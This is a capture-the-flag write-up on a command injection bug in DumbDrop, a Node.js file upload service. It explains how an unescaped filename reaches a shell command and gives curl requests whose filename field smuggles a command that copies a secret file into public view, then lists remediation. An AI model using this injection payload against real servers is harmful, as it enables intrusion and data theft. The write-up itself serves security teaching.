# DumbDrop :: 001 - Writeup

## Challenge
DumbDrop is a simple file upload service built with Node.js and vanilla JS. The running instance matches GitHub commit `aec12651782dc34ce9106b3bc070d0979aa62d17`. The goal is to read `/flag.txt` from the server.

Target: `http://159.65.164.132:31301`

## Analysis
Reviewing the source at the specified commit shows an upload flow that accepts a `filename` and `fileSize` in `/upload/init`, then streams chunks to `/upload/chunk/:uploadId`. When an upload finishes, the server calls `sendNotification(filename)`:

```js
await execAsync(`apprise "${APPRISE_URL}" -b "${message}"`);
```

`message` is derived from `APPRISE_MESSAGE` with `{filename}` replaced by the user-provided `filename`. Because `execAsync` runs a shell command and the `filename` is embedded directly inside double quotes without escaping, a crafted filename containing a `"` can break out of the quoted argument and inject arbitrary shell commands.

The challenge instance has Apprise enabled, so finishing any upload triggers the vulnerable code path.

## Vulnerability
Command injection in the notification hook:
- User-controlled `filename` is interpolated into a shell command.
- No escaping or sanitization is performed.
- Injected shell command executes with the server's privileges.

## Exploitation
Inject a payload that writes the flag to a web-accessible file. The server serves files from `public/`, so we can write to `public/flag.txt`.

### 1) Initialize upload with an injected filename
```bash
curl -sS -X POST http://159.65.164.132:31301/upload/init \
  -H 'Content-Type: application/json' \
  -d '{"filename":"a\"; cat /flag.txt > public/flag.txt; #","fileSize":1}'
```

Save the returned `uploadId`.

### 2) Send a single-byte chunk to complete the upload
```bash
curl -sS -X POST http://159.65.164.132:31301/upload/chunk/<uploadId> \
  -H 'Content-Type: application/octet-stream' \
  --data-binary 'A'
```

Once the upload completes, the notification command runs and the injected `cat` writes the flag to `public/flag.txt`.

### 3) Read the flag
```bash
curl -sS http://159.65.164.132:31301/flag.txt
```

## Flag
```
flag{33729eed-e009-4e92-a400-5584fb6cafbe}
```

## Notes
- If Apprise is not configured, the exploit path would not trigger.
- Proper remediation is to avoid shelling out or to use safe argument escaping (or the `execFile` API).
